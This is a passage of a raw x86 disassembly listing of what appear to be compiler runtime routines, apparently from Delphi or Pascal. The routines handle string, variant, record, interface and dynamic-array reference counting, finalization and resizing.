  403c8f:	85 c0                	test   %eax,%eax
  403c91:	74 23                	je     0x403cb6
  403c93:	83 78 f8 01          	cmpl   $0x1,-0x8(%eax)
  403c97:	75 1d                	jne    0x403cb6
  403c99:	83 e8 08             	sub    $0x8,%eax
  403c9c:	83 c2 09             	add    $0x9,%edx
  403c9f:	50                   	push   %eax
  403ca0:	89 e0                	mov    %esp,%eax
  403ca2:	e8 d9 eb ff ff       	call   0x402880
  403ca7:	58                   	pop    %eax
  403ca8:	83 c0 08             	add    $0x8,%eax
  403cab:	89 03                	mov    %eax,(%ebx)
  403cad:	89 70 fc             	mov    %esi,-0x4(%eax)
  403cb0:	c6 04 06 00          	movb   $0x0,(%esi,%eax,1)
  403cb4:	eb 28                	jmp    0x403cde
  403cb6:	89 d0                	mov    %edx,%eax
  403cb8:	e8 9b fa ff ff       	call   0x403758
  403cbd:	89 c7                	mov    %eax,%edi
  403cbf:	8b 03                	mov    (%ebx),%eax
  403cc1:	85 c0                	test   %eax,%eax
  403cc3:	74 10                	je     0x403cd5
  403cc5:	89 fa                	mov    %edi,%edx
  403cc7:	8b 48 fc             	mov    -0x4(%eax),%ecx
  403cca:	39 f1                	cmp    %esi,%ecx
  403ccc:	7c 02                	jl     0x403cd0
  403cce:	89 f1                	mov    %esi,%ecx
  403cd0:	e8 6f ec ff ff       	call   0x402944
  403cd5:	89 d8                	mov    %ebx,%eax
  403cd7:	e8 b8 f9 ff ff       	call   0x403694
  403cdc:	89 3b                	mov    %edi,(%ebx)
  403cde:	5f                   	pop    %edi
  403cdf:	5e                   	pop    %esi
  403ce0:	5b                   	pop    %ebx
  403ce1:	c3                   	ret
  403ce2:	8b c0                	mov    %eax,%eax
  403ce4:	b0 01                	mov    $0x1,%al
  403ce6:	e9 3d ec ff ff       	jmp    0x402928
  403ceb:	c3                   	ret
  403cec:	8b 10                	mov    (%eax),%edx
  403cee:	85 d2                	test   %edx,%edx
  403cf0:	74 0e                	je     0x403d00
  403cf2:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  403cf8:	50                   	push   %eax
  403cf9:	52                   	push   %edx
  403cfa:	e8 fd d3 ff ff       	call   0x4010fc
  403cff:	58                   	pop    %eax
  403d00:	c3                   	ret
  403d01:	8d 40 00             	lea    0x0(%eax),%eax
  403d04:	53                   	push   %ebx
  403d05:	56                   	push   %esi
  403d06:	89 c3                	mov    %eax,%ebx
  403d08:	89 d6                	mov    %edx,%esi
  403d0a:	8b 03                	mov    (%ebx),%eax
  403d0c:	85 c0                	test   %eax,%eax
  403d0e:	74 0c                	je     0x403d1c
  403d10:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  403d16:	50                   	push   %eax
  403d17:	e8 e0 d3 ff ff       	call   0x4010fc
  403d1c:	83 c3 04             	add    $0x4,%ebx
  403d1f:	4e                   	dec    %esi
  403d20:	75 e8                	jne    0x403d0a
  403d22:	5e                   	pop    %esi
  403d23:	5b                   	pop    %ebx
  403d24:	c3                   	ret
  403d25:	8d 40 00             	lea    0x0(%eax),%eax
  403d28:	85 d2                	test   %edx,%edx
  403d2a:	0f 84 bc ff ff ff    	je     0x403cec
  403d30:	8b 4a fc             	mov    -0x4(%edx),%ecx
  403d33:	d1 e9                	shr    $1,%ecx
  403d35:	0f 84 b1 ff ff ff    	je     0x403cec
  403d3b:	51                   	push   %ecx
  403d3c:	52                   	push   %edx
  403d3d:	50                   	push   %eax
  403d3e:	e8 b1 d3 ff ff       	call   0x4010f4
  403d43:	85 c0                	test   %eax,%eax
  403d45:	0f 84 99 ff ff ff    	je     0x403ce4
  403d4b:	c3                   	ret
  403d4c:	31 c9                	xor    %ecx,%ecx
  403d4e:	53                   	push   %ebx
  403d4f:	8a 4a 01             	mov    0x1(%edx),%cl
  403d52:	56                   	push   %esi
  403d53:	57                   	push   %edi
  403d54:	89 c3                	mov    %eax,%ebx
  403d56:	8d 74 11 0a          	lea    0xa(%ecx,%edx,1),%esi
  403d5a:	8b 7c 11 06          	mov    0x6(%ecx,%edx,1),%edi
  403d5e:	8b 16                	mov    (%esi),%edx
  403d60:	8b 46 04             	mov    0x4(%esi),%eax
  403d63:	01 d8                	add    %ebx,%eax
  403d65:	8b 12                	mov    (%edx),%edx
  403d67:	b9 01 00 00 00       	mov    $0x1,%ecx
  403d6c:	e8 27 00 00 00       	call   0x403d98
  403d71:	83 c6 08             	add    $0x8,%esi
  403d74:	4f                   	dec    %edi
  403d75:	7f e7                	jg     0x403d5e
  403d77:	89 d8                	mov    %ebx,%eax
  403d79:	5f                   	pop    %edi
  403d7a:	5e                   	pop    %esi
  403d7b:	5b                   	pop    %ebx
  403d7c:	c3                   	ret
  403d7d:	8d 40 00             	lea    0x0(%eax),%eax
  403d80:	83 3d 0c 60 42 00 00 	cmpl   $0x0,0x42600c
  403d87:	74 07                	je     0x403d90
  403d89:	ff 15 0c 60 42 00    	call   *0x42600c
  403d8f:	c3                   	ret
  403d90:	b0 10                	mov    $0x10,%al
  403d92:	e8 91 eb ff ff       	call   0x402928
  403d97:	c3                   	ret
  403d98:	83 f9 00             	cmp    $0x0,%ecx
  403d9b:	0f 84 e0 00 00 00    	je     0x403e81
  403da1:	50                   	push   %eax
  403da2:	53                   	push   %ebx
  403da3:	56                   	push   %esi
  403da4:	57                   	push   %edi
  403da5:	89 c3                	mov    %eax,%ebx
  403da7:	89 d6                	mov    %edx,%esi
  403da9:	89 cf                	mov    %ecx,%edi
  403dab:	31 d2                	xor    %edx,%edx
  403dad:	8a 06                	mov    (%esi),%al
  403daf:	8a 56 01             	mov    0x1(%esi),%dl
  403db2:	3c 0a                	cmp    $0xa,%al
  403db4:	74 25                	je     0x403ddb
  403db6:	3c 0b                	cmp    $0xb,%al
  403db8:	74 3e                	je     0x403df8
  403dba:	3c 0c                	cmp    $0xc,%al
  403dbc:	74 51                	je     0x403e0f
  403dbe:	3c 0d                	cmp    $0xd,%al
  403dc0:	74 5c                	je     0x403e1e
  403dc2:	3c 0e                	cmp    $0xe,%al
  403dc4:	74 76                	je     0x403e3c
  403dc6:	3c 0f                	cmp    $0xf,%al
  403dc8:	0f 84 84 00 00 00    	je     0x403e52
  403dce:	3c 11                	cmp    $0x11,%al
  403dd0:	0f 84 8b 00 00 00    	je     0x403e61
  403dd6:	e9 97 00 00 00       	jmp    0x403e72
  403ddb:	83 f9 01             	cmp    $0x1,%ecx
  403dde:	89 d8                	mov    %ebx,%eax
  403de0:	7f 0a                	jg     0x403dec
  403de2:	e8 ad f8 ff ff       	call   0x403694
  403de7:	e9 91 00 00 00       	jmp    0x403e7d
  403dec:	89 ca                	mov    %ecx,%edx
  403dee:	e8 c5 f8 ff ff       	call   0x4036b8
  403df3:	e9 85 00 00 00       	jmp    0x403e7d
  403df8:	83 f9 01             	cmp    $0x1,%ecx
  403dfb:	89 d8                	mov    %ebx,%eax
  403dfd:	7f 07                	jg     0x403e06
  403dff:	e8 e8 fe ff ff       	call   0x403cec
  403e04:	eb 77                	jmp    0x403e7d
  403e06:	89 ca                	mov    %ecx,%edx
  403e08:	e8 f7 fe ff ff       	call   0x403d04
  403e0d:	eb 6e                	jmp    0x403e7d
  403e0f:	89 d8                	mov    %ebx,%eax
  403e11:	83 c3 10             	add    $0x10,%ebx
  403e14:	e8 67 ff ff ff       	call   0x403d80
  403e19:	4f                   	dec    %edi
  403e1a:	7f f3                	jg     0x403e0f
  403e1c:	eb 5f                	jmp    0x403e7d
  403e1e:	55                   	push   %ebp
  403e1f:	89 d5                	mov    %edx,%ebp
  403e21:	8b 54 2e 0a          	mov    0xa(%esi,%ebp,1),%edx
  403e25:	89 d8                	mov    %ebx,%eax
  403e27:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  403e2b:	8b 4c 2e 06          	mov    0x6(%esi,%ebp,1),%ecx
  403e2f:	8b 12                	mov    (%edx),%edx
  403e31:	e8 62 ff ff ff       	call   0x403d98
  403e36:	4f                   	dec    %edi
  403e37:	7f e8                	jg     0x403e21
  403e39:	5d                   	pop    %ebp
  403e3a:	eb 41                	jmp    0x403e7d
  403e3c:	55                   	push   %ebp
  403e3d:	89 d5                	mov    %edx,%ebp
  403e3f:	89 d8                	mov    %ebx,%eax
  403e41:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  403e45:	89 f2                	mov    %esi,%edx
  403e47:	e8 00 ff ff ff       	call   0x403d4c
  403e4c:	4f                   	dec    %edi
  403e4d:	7f f0                	jg     0x403e3f
  403e4f:	5d                   	pop    %ebp
  403e50:	eb 2b                	jmp    0x403e7d
  403e52:	89 d8                	mov    %ebx,%eax
  403e54:	83 c3 04             	add    $0x4,%ebx
  403e57:	e8 9c 05 00 00       	call   0x4043f8
  403e5c:	4f                   	dec    %edi
  403e5d:	7f f3                	jg     0x403e52
  403e5f:	eb 1c                	jmp    0x403e7d
  403e61:	89 d8                	mov    %ebx,%eax
  403e63:	89 f2                	mov    %esi,%edx
  403e65:	83 c3 04             	add    $0x4,%ebx
  403e68:	e8 37 04 00 00       	call   0x4042a4
  403e6d:	4f                   	dec    %edi
  403e6e:	7f f1                	jg     0x403e61
  403e70:	eb 0b                	jmp    0x403e7d
  403e72:	5f                   	pop    %edi
  403e73:	5e                   	pop    %esi
  403e74:	5b                   	pop    %ebx
  403e75:	58                   	pop    %eax
  403e76:	b0 02                	mov    $0x2,%al
  403e78:	e9 ab ea ff ff       	jmp    0x402928
  403e7d:	5f                   	pop    %edi
  403e7e:	5e                   	pop    %esi
  403e7f:	5b                   	pop    %ebx
  403e80:	58                   	pop    %eax
  403e81:	c3                   	ret
  403e82:	8b c0                	mov    %eax,%eax
  403e84:	83 3d 10 60 42 00 00 	cmpl   $0x0,0x426010
  403e8b:	74 07                	je     0x403e94
  403e8d:	ff 15 10 60 42 00    	call   *0x426010
  403e93:	c3                   	ret
  403e94:	b0 10                	mov    $0x10,%al
  403e96:	e8 8d ea ff ff       	call   0x402928
  403e9b:	c3                   	ret
  403e9c:	53                   	push   %ebx
  403e9d:	56                   	push   %esi
  403e9e:	57                   	push   %edi
  403e9f:	55                   	push   %ebp
  403ea0:	89 c3                	mov    %eax,%ebx
  403ea2:	89 d6                	mov    %edx,%esi
  403ea4:	31 c0                	xor    %eax,%eax
  403ea6:	8a 41 01             	mov    0x1(%ecx),%al
  403ea9:	8d 7c 08 0a          	lea    0xa(%eax,%ecx,1),%edi
  403ead:	8b 6f fc             	mov    -0x4(%edi),%ebp
  403eb0:	31 c0                	xor    %eax,%eax
  403eb2:	8b 4f f8             	mov    -0x8(%edi),%ecx
  403eb5:	51                   	push   %ecx
  403eb6:	8b 4f 04             	mov    0x4(%edi),%ecx
  403eb9:	29 c1                	sub    %eax,%ecx
  403ebb:	7e 0b                	jle    0x403ec8
  403ebd:	89 c2                	mov    %eax,%edx
  403ebf:	01 f0                	add    %esi,%eax
  403ec1:	01 da                	add    %ebx,%edx
  403ec3:	e8 7c ea ff ff       	call   0x402944
  403ec8:	8b 47 04             	mov    0x4(%edi),%eax
  403ecb:	8b 17                	mov    (%edi),%edx
  403ecd:	8b 12                	mov    (%edx),%edx
  403ecf:	8a 0a                	mov    (%edx),%cl
  403ed1:	80 f9 0a             	cmp    $0xa,%cl
  403ed4:	74 31                	je     0x403f07
  403ed6:	80 f9 0b             	cmp    $0xb,%cl
  403ed9:	74 3d                	je     0x403f18
  403edb:	80 f9 0c             	cmp    $0xc,%cl
  403ede:	74 49                	je     0x403f29
  403ee0:	80 f9 0d             	cmp    $0xd,%cl
  403ee3:	74 55                	je     0x403f3a
  403ee5:	80 f9 0e             	cmp    $0xe,%cl
  403ee8:	74 70                	je     0x403f5a
  403eea:	80 f9 0f             	cmp    $0xf,%cl
  403eed:	0f 84 80 00 00 00    	je     0x403f73
  403ef3:	80 f9 11             	cmp    $0x11,%cl
  403ef6:	0f 84 88 00 00 00    	je     0x403f84
  403efc:	b0 02                	mov    $0x2,%al
  403efe:	5d                   	pop    %ebp
  403eff:	5f                   	pop    %edi
  403f00:	5e                   	pop    %esi
  403f01:	5b                   	pop    %ebx
  403f02:	e9 21 ea ff ff       	jmp    0x402928
  403f07:	8b 14 30             	mov    (%eax,%esi,1),%edx
  403f0a:	01 d8                	add    %ebx,%eax
  403f0c:	e8 d7 f7 ff ff       	call   0x4036e8
  403f11:	b8 04 00 00 00       	mov    $0x4,%eax
  403f16:	eb 7d                	jmp    0x403f95
  403f18:	8b 14 30             	mov    (%eax,%esi,1),%edx
  403f1b:	01 d8                	add    %ebx,%eax
  403f1d:	e8 06 fe ff ff       	call   0x403d28
  403f22:	b8 04 00 00 00       	mov    $0x4,%eax
  403f27:	eb 6c                	jmp    0x403f95
  403f29:	8d 14 30             	lea    (%eax,%esi,1),%edx
  403f2c:	01 d8                	add    %ebx,%eax
  403f2e:	e8 51 ff ff ff       	call   0x403e84
  403f33:	b8 10 00 00 00       	mov    $0x10,%eax
  403f38:	eb 5b                	jmp    0x403f95
  403f3a:	31 c9                	xor    %ecx,%ecx
  403f3c:	8a 4a 01             	mov    0x1(%edx),%cl
  403f3f:	ff 74 11 02          	push   0x2(%ecx,%edx,1)
  403f43:	ff 74 11 06          	push   0x6(%ecx,%edx,1)
  403f47:	8b 4c 11 0a          	mov    0xa(%ecx,%edx,1),%ecx
  403f4b:	8b 09                	mov    (%ecx),%ecx
  403f4d:	8d 14 30             	lea    (%eax,%esi,1),%edx
  403f50:	01 d8                	add    %ebx,%eax
  403f52:	e8 61 00 00 00       	call   0x403fb8
  403f57:	58                   	pop    %eax
  403f58:	eb 3b                	jmp    0x403f95
  403f5a:	31 c9                	xor    %ecx,%ecx
  403f5c:	8a 4a 01             	mov    0x1(%edx),%cl
  403f5f:	8b 4c 11 02          	mov    0x2(%ecx,%edx,1),%ecx
  403f63:	51                   	push   %ecx
  403f64:	89 d1                	mov    %edx,%ecx
  403f66:	8d 14 30             	lea    (%eax,%esi,1),%edx
  403f69:	01 d8                	add    %ebx,%eax
  403f6b:	e8 2c ff ff ff       	call   0x403e9c
  403f70:	58                   	pop    %eax
  403f71:	eb 22                	jmp    0x403f95
  403f73:	8b 14 30             	mov    (%eax,%esi,1),%edx
  403f76:	01 d8                	add    %ebx,%eax
  403f78:	e8 93 04 00 00       	call   0x404410
  403f7d:	b8 04 00 00 00       	mov    $0x4,%eax
  403f82:	eb 11                	jmp    0x403f95
  403f84:	89 d1                	mov    %edx,%ecx
  403f86:	8b 14 30             	mov    (%eax,%esi,1),%edx
  403f89:	01 d8                	add    %ebx,%eax
  403f8b:	e8 50 03 00 00       	call   0x4042e0
  403f90:	b8 04 00 00 00       	mov    $0x4,%eax
  403f95:	03 47 04             	add    0x4(%edi),%eax
  403f98:	83 c7 08             	add    $0x8,%edi
  403f9b:	4d                   	dec    %ebp
  403f9c:	0f 85 14 ff ff ff    	jne    0x403eb6
  403fa2:	59                   	pop    %ecx
  403fa3:	29 c1                	sub    %eax,%ecx
  403fa5:	7e 0a                	jle    0x403fb1
  403fa7:	8d 14 18             	lea    (%eax,%ebx,1),%edx
  403faa:	01 f0                	add    %esi,%eax
  403fac:	e8 93 e9 ff ff       	call   0x402944
  403fb1:	5d                   	pop    %ebp
  403fb2:	5f                   	pop    %edi
  403fb3:	5e                   	pop    %esi
  403fb4:	5b                   	pop    %ebx
  403fb5:	c3                   	ret
  403fb6:	8b c0                	mov    %eax,%eax
  403fb8:	53                   	push   %ebx
  403fb9:	56                   	push   %esi
  403fba:	57                   	push   %edi
  403fbb:	55                   	push   %ebp
  403fbc:	89 c3                	mov    %eax,%ebx
  403fbe:	89 d6                	mov    %edx,%esi
  403fc0:	89 cf                	mov    %ecx,%edi
  403fc2:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  403fc6:	8a 0f                	mov    (%edi),%cl
  403fc8:	80 f9 0a             	cmp    $0xa,%cl
  403fcb:	74 31                	je     0x403ffe
  403fcd:	80 f9 0b             	cmp    $0xb,%cl
  403fd0:	74 43                	je     0x404015
  403fd2:	80 f9 0c             	cmp    $0xc,%cl
  403fd5:	74 52                	je     0x404029
  403fd7:	80 f9 0d             	cmp    $0xd,%cl
  403fda:	74 61                	je     0x40403d
  403fdc:	80 f9 0e             	cmp    $0xe,%cl
  403fdf:	74 7d                	je     0x40405e
  403fe1:	80 f9 0f             	cmp    $0xf,%cl
  403fe4:	0f 84 91 00 00 00    	je     0x40407b
  403fea:	80 f9 11             	cmp    $0x11,%cl
  403fed:	0f 84 9c 00 00 00    	je     0x40408f
  403ff3:	b0 02                	mov    $0x2,%al
  403ff5:	5d                   	pop    %ebp
  403ff6:	5f                   	pop    %edi
  403ff7:	5e                   	pop    %esi
  403ff8:	5b                   	pop    %ebx
  403ff9:	e9 2a e9 ff ff       	jmp    0x402928
  403ffe:	89 d8                	mov    %ebx,%eax
  404000:	8b 16                	mov    (%esi),%edx
  404002:	e8 e1 f6 ff ff       	call   0x4036e8
  404007:	83 c3 04             	add    $0x4,%ebx
  40400a:	83 c6 04             	add    $0x4,%esi
  40400d:	4d                   	dec    %ebp
  40400e:	75 ee                	jne    0x403ffe
  404010:	e9 8e 00 00 00       	jmp    0x4040a3
  404015:	89 d8                	mov    %ebx,%eax
  404017:	8b 16                	mov    (%esi),%edx
  404019:	e8 0a fd ff ff       	call   0x403d28
  40401e:	83 c3 04             	add    $0x4,%ebx
  404021:	83 c6 04             	add    $0x4,%esi
  404024:	4d                   	dec    %ebp
  404025:	75 ee                	jne    0x404015
  404027:	eb 7a                	jmp    0x4040a3
  404029:	89 d8                	mov    %ebx,%eax
  40402b:	89 f2                	mov    %esi,%edx
  40402d:	e8 52 fe ff ff       	call   0x403e84
  404032:	83 c3 10             	add    $0x10,%ebx
  404035:	83 c6 10             	add    $0x10,%esi
  404038:	4d                   	dec    %ebp
  404039:	75 ee                	jne    0x404029
  40403b:	eb 66                	jmp    0x4040a3
  40403d:	31 c9                	xor    %ecx,%ecx
  40403f:	8a 4f 01             	mov    0x1(%edi),%cl
  404042:	8d 7c 39 02          	lea    0x2(%ecx,%edi,1),%edi
  404046:	89 d8                	mov    %ebx,%eax
  404048:	89 f2                	mov    %esi,%edx
  40404a:	8b 4f 08             	mov    0x8(%edi),%ecx
  40404d:	ff 77 04             	push   0x4(%edi)
  404050:	e8 63 ff ff ff       	call   0x403fb8
  404055:	03 1f                	add    (%edi),%ebx
  404057:	03 37                	add    (%edi),%esi
  404059:	4d                   	dec    %ebp
  40405a:	75 ea                	jne    0x404046
  40405c:	eb 45                	jmp    0x4040a3
  40405e:	89 d8                	mov    %ebx,%eax
  404060:	89 f2                	mov    %esi,%edx
  404062:	89 f9                	mov    %edi,%ecx
  404064:	e8 33 fe ff ff       	call   0x403e9c
  404069:	31 c0                	xor    %eax,%eax
  40406b:	8a 47 01             	mov    0x1(%edi),%al
  40406e:	03 5c 38 02          	add    0x2(%eax,%edi,1),%ebx
  404072:	03 74 38 02          	add    0x2(%eax,%edi,1),%esi
  404076:	4d                   	dec    %ebp
  404077:	75 e5                	jne    0x40405e
  404079:	eb 28                	jmp    0x4040a3
  40407b:	89 d8                	mov    %ebx,%eax
  40407d:	8b 16                	mov    (%esi),%edx
  40407f:	e8 8c 03 00 00       	call   0x404410
  404084:	83 c3 04             	add    $0x4,%ebx
  404087:	83 c6 04             	add    $0x4,%esi
  40408a:	4d                   	dec    %ebp
  40408b:	75 ee                	jne    0x40407b
  40408d:	eb 14                	jmp    0x4040a3
  40408f:	89 d8                	mov    %ebx,%eax
  404091:	8b 16                	mov    (%esi),%edx
  404093:	89 f9                	mov    %edi,%ecx
  404095:	e8 46 02 00 00       	call   0x4042e0
  40409a:	83 c3 04             	add    $0x4,%ebx
  40409d:	83 c6 04             	add    $0x4,%esi
  4040a0:	4d                   	dec    %ebp
  4040a1:	75 ec                	jne    0x40408f
  4040a3:	5d                   	pop    %ebp
  4040a4:	5f                   	pop    %edi
  4040a5:	5e                   	pop    %esi
  4040a6:	5b                   	pop    %ebx
  4040a7:	c2 04 00             	ret    $0x4
  4040aa:	c3                   	ret
  4040ab:	90                   	nop
  4040ac:	e8 03 00 00 00       	call   0x4040b4
  4040b1:	c3                   	ret
  4040b2:	8b c0                	mov    %eax,%eax
  4040b4:	92                   	xchg   %eax,%edx
  4040b5:	e8 e6 f7 ff ff       	call   0x4038a0
  4040ba:	c3                   	ret
  4040bb:	90                   	nop
  4040bc:	b0 11                	mov    $0x11,%al
  4040be:	e9 65 e8 ff ff       	jmp    0x402928
  4040c3:	c3                   	ret
  4040c4:	85 c0                	test   %eax,%eax
  4040c6:	74 03                	je     0x4040cb
  4040c8:	8b 40 fc             	mov    -0x4(%eax),%eax
  4040cb:	c3                   	ret
  4040cc:	55                   	push   %ebp
  4040cd:	8b ec                	mov    %esp,%ebp
  4040cf:	ff 75 08             	push   0x8(%ebp)
  4040d2:	e8 e1 fe ff ff       	call   0x403fb8
  4040d7:	5d                   	pop    %ebp
  4040d8:	c2 04 00             	ret    $0x4
  4040db:	90                   	nop
  4040dc:	e9 b7 fc ff ff       	jmp    0x403d98
  4040e1:	c3                   	ret
  4040e2:	8b c0                	mov    %eax,%eax
  4040e4:	e8 bb 01 00 00       	call   0x4042a4
  4040e9:	c3                   	ret
  4040ea:	8b c0                	mov    %eax,%eax
  4040ec:	55                   	push   %ebp
  4040ed:	8b ec                	mov    %esp,%ebp
  4040ef:	83 c4 e4             	add    $0xffffffe4,%esp
  4040f2:	53                   	push   %ebx
  4040f3:	56                   	push   %esi
  4040f4:	57                   	push   %edi
  4040f5:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  4040f8:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4040fb:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4040fe:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404101:	8b 00                	mov    (%eax),%eax
  404103:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404106:	8b 45 08             	mov    0x8(%ebp),%eax
  404109:	8b 18                	mov    (%eax),%ebx
  40410b:	85 db                	test   %ebx,%ebx
  40410d:	7f 1b                	jg     0x40412a
  40410f:	85 db                	test   %ebx,%ebx
  404111:	7d 07                	jge    0x40411a
  404113:	b0 04                	mov    $0x4,%al
  404115:	e8 0e e8 ff ff       	call   0x402928
  40411a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40411d:	8b 55 f8             	mov    -0x8(%ebp),%edx
  404120:	e8 bf ff ff ff       	call   0x4040e4
  404125:	e9 63 01 00 00       	jmp    0x40428d
  40412a:	33 ff                	xor    %edi,%edi
  40412c:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  404130:	74 0d                	je     0x40413f
  404132:	83 6d e8 04          	subl   $0x4,-0x18(%ebp)
  404136:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404139:	8b 38                	mov    (%eax),%edi
  40413b:	83 6d e8 04          	subl   $0x4,-0x18(%ebp)
  40413f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404142:	0f b6 40 01          	movzbl 0x1(%eax),%eax
  404146:	01 45 f8             	add    %eax,-0x8(%ebp)
  404149:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40414c:	8b 70 02             	mov    0x2(%eax),%esi
  40414f:	8b 50 06             	mov    0x6(%eax),%edx
  404152:	85 d2                	test   %edx,%edx
  404154:	74 07                	je     0x40415d
  404156:	8b 02                	mov    (%edx),%eax
  404158:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40415b:	eb 05                	jmp    0x404162
  40415d:	33 c0                	xor    %eax,%eax
  40415f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404162:	8b c3                	mov    %ebx,%eax
  404164:	f7 ee                	imul   %esi
  404166:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404169:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40416c:	99                   	cltd
  40416d:	f7 fb                	idiv   %ebx
  40416f:	3b f0                	cmp    %eax,%esi
  404171:	74 07                	je     0x40417a
  404173:	b0 04                	mov    $0x4,%al
  404175:	e8 ae e7 ff ff       	call   0x402928
  40417a:	83 45 ec 08          	addl   $0x8,-0x14(%ebp)
  40417e:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  404182:	74 08                	je     0x40418c
  404184:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404187:	83 38 01             	cmpl   $0x1,(%eax)
  40418a:	75 3c                	jne    0x4041c8
  40418c:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40418f:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404192:	3b fb                	cmp    %ebx,%edi
  404194:	7e 1f                	jle    0x4041b5
  404196:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  40419a:	74 19                	je     0x4041b5
  40419c:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40419f:	83 c0 08             	add    $0x8,%eax
  4041a2:	8b d3                	mov    %ebx,%edx
  4041a4:	0f af d6             	imul   %esi,%edx
  4041a7:	03 c2                	add    %edx,%eax
  4041a9:	8b cf                	mov    %edi,%ecx
  4041ab:	2b cb                	sub    %ebx,%ecx
  4041ad:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4041b0:	e8 27 ff ff ff       	call   0x4040dc
  4041b5:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4041b8:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4041bb:	e8 c0 e6 ff ff       	call   0x402880
  4041c0:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4041c3:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4041c6:	eb 63                	jmp    0x40422b
  4041c8:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4041cb:	ff 08                	decl   (%eax)
  4041cd:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4041d0:	e8 5b e6 ff ff       	call   0x402830
  4041d5:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4041d8:	89 7d f0             	mov    %edi,-0x10(%ebp)
  4041db:	3b 5d f0             	cmp    -0x10(%ebp),%ebx
  4041de:	7d 03                	jge    0x4041e3
  4041e0:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  4041e3:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  4041e7:	74 2c                	je     0x404215
  4041e9:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4041ec:	0f af d6             	imul   %esi,%edx
  4041ef:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4041f2:	83 c0 08             	add    $0x8,%eax
  4041f5:	33 c9                	xor    %ecx,%ecx
  4041f7:	e8 98 e8 ff ff       	call   0x402a94
  4041fc:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4041ff:	50                   	push   %eax
  404200:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404203:	8b 12                	mov    (%edx),%edx
  404205:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404208:	83 c0 08             	add    $0x8,%eax
  40420b:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40420e:	e8 b9 fe ff ff       	call   0x4040cc
  404213:	eb 16                	jmp    0x40422b
  404215:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404218:	0f af ce             	imul   %esi,%ecx
  40421b:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40421e:	83 c2 08             	add    $0x8,%edx
  404221:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404224:	8b 00                	mov    (%eax),%eax
  404226:	e8 19 e7 ff ff       	call   0x402944
  40422b:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40422e:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  404234:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  404238:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40423b:	89 18                	mov    %ebx,(%eax)
  40423d:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  404241:	8b d3                	mov    %ebx,%edx
  404243:	2b d7                	sub    %edi,%edx
  404245:	0f af d6             	imul   %esi,%edx
  404248:	8b c6                	mov    %esi,%eax
  40424a:	0f af c7             	imul   %edi,%eax
  40424d:	03 45 e8             	add    -0x18(%ebp),%eax
  404250:	33 c9                	xor    %ecx,%ecx
  404252:	e8 3d e8 ff ff       	call   0x402a94
  404257:	83 7d f4 01          	cmpl   $0x1,-0xc(%ebp)
  40425b:	7e 28                	jle    0x404285
  40425d:	83 45 08 04          	addl   $0x4,0x8(%ebp)
  404261:	ff 4d f4             	decl   -0xc(%ebp)
  404264:	4b                   	dec    %ebx
  404265:	85 db                	test   %ebx,%ebx
  404267:	7c 1c                	jl     0x404285
  404269:	43                   	inc    %ebx
  40426a:	33 f6                	xor    %esi,%esi
  40426c:	8b 45 08             	mov    0x8(%ebp),%eax
  40426f:	50                   	push   %eax
  404270:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404273:	8d 04 b0             	lea    (%eax,%esi,4),%eax
  404276:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404279:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40427c:	e8 6b fe ff ff       	call   0x4040ec
  404281:	46                   	inc    %esi
  404282:	4b                   	dec    %ebx
  404283:	75 e7                	jne    0x40426c
  404285:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404288:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40428b:	89 10                	mov    %edx,(%eax)
  40428d:	5f                   	pop    %edi
  40428e:	5e                   	pop    %esi
  40428f:	5b                   	pop    %ebx
  404290:	8b e5                	mov    %ebp,%esp
  404292:	5d                   	pop    %ebp
  404293:	c2 04 00             	ret    $0x4
  404296:	8b c0                	mov    %eax,%eax
  404298:	54                   	push   %esp
  404299:	83 04 24 04          	addl   $0x4,(%esp)
  40429d:	e8 4a fe ff ff       	call   0x4040ec
  4042a2:	c3                   	ret
  4042a3:	90                   	nop
